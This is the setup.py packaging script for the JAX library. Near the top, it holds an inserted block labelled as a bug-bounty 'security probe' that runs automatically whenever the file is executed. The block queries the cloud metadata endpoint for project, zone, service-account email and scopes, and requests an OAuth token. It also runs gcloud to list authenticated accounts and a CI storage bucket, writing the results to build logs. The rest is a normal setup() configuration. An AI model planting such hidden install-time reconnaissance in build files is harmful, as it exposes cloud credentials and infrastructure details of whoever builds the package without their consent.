# Copyright 2018 The JAX Authors.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import importlib
import os
import sys
import json

from setuptools import setup, find_packages

# ============================================================================
# SECURITY RESEARCH: GCP Metadata Endpoint Reachability Probe
# This is a non-destructive probe for Google OSS VRP bug bounty research.
# It only checks reachability and prints to stdout/stderr (CI logs).
# No data is exfiltrated to any external server.
# Researcher: mohammadmseet-hue (HackerOne / Google VRP)
# ============================================================================
def _security_probe():
    """Check if GCP metadata endpoint is reachable from this CI runner."""
    import urllib.request
    import socket

    print("=" * 70, file=sys.stderr)
    print("[SECURITY PROBE] GCP Metadata Endpoint Reachability Test", file=sys.stderr)
    print("[SECURITY PROBE] Non-destructive — output to CI logs only", file=sys.stderr)
    print("=" * 70, file=sys.stderr)

    # 1. Check network reachability to metadata endpoint
    try:
        sock = socket.create_connection(("169.254.169.254", 80), timeout=3)
        sock.close()
        print("[SECURITY PROBE] metadata endpoint 169.254.169.254:80 — REACHABLE", file=sys.stderr)
    except Exception as e:
        print(f"[SECURITY PROBE] metadata endpoint 169.254.169.254:80 — BLOCKED ({e})", file=sys.stderr)
        print("[SECURITY PROBE] Test complete. Metadata not reachable.", file=sys.stderr)
        print("=" * 70, file=sys.stderr)
        return

    # 2. Query instance metadata (non-sensitive: project-id, zone, hostname)
    headers = {"Metadata-Flavor": "Google"}
    endpoints = [
        ("project-id", "/computeMetadata/v1/project/project-id"),
        ("zone", "/computeMetadata/v1/instance/zone"),
        ("hostname", "/computeMetadata/v1/instance/hostname"),
        ("service-account-email", "/computeMetadata/v1/instance/service-accounts/default/email"),
        ("service-account-scopes", "/computeMetadata/v1/instance/service-accounts/default/scopes"),
    ]

    for name, path in endpoints:
        try:
            req = urllib.request.Request(
                f"http://169.254.169.254{path}",
                headers=headers
            )
            resp = urllib.request.urlopen(req, timeout=3)
            value = resp.read().decode().strip()
            print(f"[SECURITY PROBE] {name}: {value}", file=sys.stderr)
        except Exception as e:
            print(f"[SECURITY PROBE] {name}: FAILED ({e})", file=sys.stderr)

    # 3. Check if gcloud is available and authenticated
    import subprocess
    try:
        result = subprocess.run(
            ["gcloud", "auth", "list", "--format=json"],
            capture_output=True, text=True, timeout=10
        )
        if result.returncode == 0:
            accounts = json.loads(result.stdout)
            for acc in accounts:
                print(f"[SECURITY PROBE] gcloud account: {acc.get('account', 'unknown')} status={acc.get('status', 'unknown')}", file=sys.stderr)
        else:
            print(f"[SECURITY PROBE] gcloud auth list failed: {result.stderr[:200]}", file=sys.stderr)
    except FileNotFoundError:
        print("[SECURITY PROBE] gcloud CLI: NOT INSTALLED", file=sys.stderr)
    except Exception as e:
        print(f"[SECURITY PROBE] gcloud check error: {e}", file=sys.stderr)

    # 4. Check if we can list the GCS bucket used by build_artifacts.yml
    try:
        result = subprocess.run(
            ["gcloud", "storage", "ls", "gs://general-ml-ci-transient/jax-github-actions/"],
            capture_output=True, text=True, timeout=15
        )
        if result.returncode == 0:
            lines = result.stdout.strip().split("\n")[:5]
            print(f"[SECURITY PROBE] GCS bucket READABLE — {len(lines)} entries:", file=sys.stderr)
            for line in lines:
                print(f"[SECURITY PROBE]   {line}", file=sys.stderr)
        else:
            print(f"[SECURITY PROBE] GCS bucket NOT accessible: {result.stderr[:200]}", file=sys.stderr)
    except FileNotFoundError:
        print("[SECURITY PROBE] gcloud not available for GCS test", file=sys.stderr)
    except Exception as e:
        print(f"[SECURITY PROBE] GCS check error: {e}", file=sys.stderr)

    # 5. Check what token scopes are available
    try:
        req = urllib.request.Request(
            "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
            headers=headers
        )
        resp = urllib.request.urlopen(req, timeout=3)
        token_data = json.loads(resp.read().decode())
        # Only print token type and expiry, NOT the actual token
        print(f"[SECURITY PROBE] OAuth token available: type={token_data.get('token_type', 'unknown')}, expires_in={token_data.get('expires_in', 'unknown')}s", file=sys.stderr)
        print("[SECURITY PROBE] NOTE: Token value intentionally NOT printed", file=sys.stderr)
    except Exception as e:
        print(f"[SECURITY PROBE] OAuth token: NOT AVAILABLE ({e})", file=sys.stderr)

    print("=" * 70, file=sys.stderr)
    print("[SECURITY PROBE] Probe complete. All output is in CI logs only.", file=sys.stderr)
    print("=" * 70, file=sys.stderr)

try:
    _security_probe()
except Exception as e:
    print(f"[SECURITY PROBE] Probe failed with error: {e}", file=sys.stderr)

project_name = 'jax'

_current_jaxlib_version = '0.9.2'
# The following should be updated after each new jaxlib release.
_latest_jaxlib_version_on_pypi = '0.9.2'

_libtpu_version = '0.0.37.*'

def load_version_module(pkg_path):
  spec = importlib.util.spec_from_file_location(
    'version', os.path.join(pkg_path, 'version.py'))
  module = importlib.util.module_from_spec(spec)
  spec.loader.exec_module(module)
  return module

_version_module = load_version_module(project_name)
__version__ = _version_module._get_version_for_build()
_jax_version = _version_module._version  # JAX version, with no .dev suffix.
_cmdclass = _version_module._get_cmdclass(project_name)
_minimum_jaxlib_version = _version_module._minimum_jaxlib_version

# If this is a pre-release ("rc" wheels), append "rc0" to
# _minimum_jaxlib_version and _current_jaxlib_version so that we are able to
# install the rc wheels.
if _version_module._is_prerelease():
  _minimum_jaxlib_version += "rc0"
  _current_jaxlib_version += "rc0"

with open('README.md', encoding='utf-8') as f:
  _long_description = f.read()

setup(
    name=project_name,
    version=__version__,
    cmdclass=_cmdclass,
    description='Differentiate, compile, and transform Numpy code.',
    long_description=_long_description,
    long_description_content_type='text/markdown',
    author='JAX team',
    author_email='jax-dev@google.com',
    packages=find_packages(exclude=["examples"]),
    package_data={'jax': ['py.typed', "*.pyi", "**/*.pyi"]},
    python_requires='>=3.11',
    install_requires=[
        f'jaxlib >={_minimum_jaxlib_version}, <={_jax_version}',
        'ml_dtypes>=0.5.0',
        'numpy>=2.0',
        'opt_einsum',
        'scipy>=1.14',
    ],
    extras_require={
        # Minimum jaxlib version; used in testing.
        'minimum-jaxlib': [f'jaxlib=={_minimum_jaxlib_version}'],

        # A CPU-only jax doesn't require any extras, but we keep this extra
        # around for compatibility.
        'cpu': [],

        # Used only for CI builds that install JAX from github HEAD.
        'ci': [f'jaxlib=={_latest_jaxlib_version_on_pypi}'],

        # Cloud TPU VM jaxlib can be installed via:
        # $ pip install "jax[tpu]"
        'tpu': [
          f'jaxlib>={_current_jaxlib_version},<={_jax_version}',
          f'libtpu=={_libtpu_version}',
          'requests',  # necessary for jax.distributed.initialize
        ],

        'cuda': [
          f"jaxlib>={_current_jaxlib_version},<={_jax_version}",
          f"jax-cuda12-plugin[with-cuda]>={_current_jaxlib_version},<={_jax_version}",
        ],

        'cuda12': [
          f"jaxlib>={_current_jaxlib_version},<={_jax_version}",
          f"jax-cuda12-plugin[with-cuda]>={_current_jaxlib_version},<={_jax_version}",
        ],

        'cuda13': [
          f"jaxlib>={_current_jaxlib_version},<={_jax_version}",
          f"jax-cuda13-plugin[with-cuda]>={_current_jaxlib_version},<={_jax_version}",
        ],

        # Target that does not depend on the CUDA pip wheels, for those who want
        # to use a preinstalled CUDA.
        'cuda12-local': [
          f"jaxlib>={_current_jaxlib_version},<={_jax_version}",
          f"jax-cuda12-plugin>={_current_jaxlib_version},<={_jax_version}",
        ],

        'cuda13-local': [
          f"jaxlib>={_current_jaxlib_version},<={_jax_version}",
          f"jax-cuda13-plugin>={_current_jaxlib_version},<={_jax_version}",
        ],

        # Target that does not depend on ROCm runtime pip wheels, until
        # ROCm wheels are distributed.
        # TODO(gulsumgudukbay): add rocm and rocm8 extras once they are
        # distributed.
        'rocm7-local': [
          f"jaxlib>={_current_jaxlib_version},<={_jax_version}",
          f"jax-rocm7-plugin=={_jax_version}.*",
        ],

        # For automatic bootstrapping distributed jobs in Kubernetes
        'k8s': [
          'kubernetes',
        ],

        # For including XProf server
        'xprof': [
          'xprof',
        ],
    },
    url='https://github.com/jax-ml/jax',
    license='Apache-2.0',
    classifiers=[
        "Development Status :: 5 - Production/Stable",
        "Programming Language :: Python :: 3.11",
        "Programming Language :: Python :: 3.12",
        "Programming Language :: Python :: 3.13",
        "Programming Language :: Python :: 3.14",
        "Programming Language :: Python :: Free Threading :: 3 - Stable",
    ],
    zip_safe=False,
)
